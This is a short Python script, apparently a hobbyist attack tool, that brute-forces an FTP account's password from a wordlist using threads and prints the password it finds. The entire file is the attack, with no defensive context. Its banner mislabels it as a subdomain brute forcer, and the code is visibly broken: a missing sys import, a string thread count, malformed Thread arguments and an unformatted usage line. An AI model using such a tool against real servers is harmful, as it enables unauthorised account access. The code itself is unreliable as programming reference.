import threading
import os
from ftplib import FTP as ftp               
        
def call(ip,uname,words):
    for passwd in words:
        passwd=passwd.rstrip()
        f=ftp(ip)
        try:
            f.login(user=uname,passwd=passwd)
            print(f'For the username : {uname} the password is ...{passwd}')
            os._exit(1)
        except:
            pass
        finally:
            f.quit()
        
def main():
    threads=[]
    words=open(sys.argv[3],'r') 
    fread=words.readlines()
    ip=sys.argv[1]
    uname=sys.argv[2]
    thread=sys.argv[4]
    for i in range(0,len(fread),thread):
        wrap=fread[i:i+thread]
        th=threading.Thread(target=call,args=ip,uname,wrap)
        th.start()
        threads.append(th)
    for thread in threads:
        thread.join()
    words.close()
    

if __name__=="__main__":
    print("WELCOME to AK's SUBDOMAIN BRUTE FORCER".center(80,'-'))
    if len(sys.argv)==5: 
        main()
    else:
        print("USE : {sys.arg[0]} <ip> <uname> <wordlist path> <thread>")
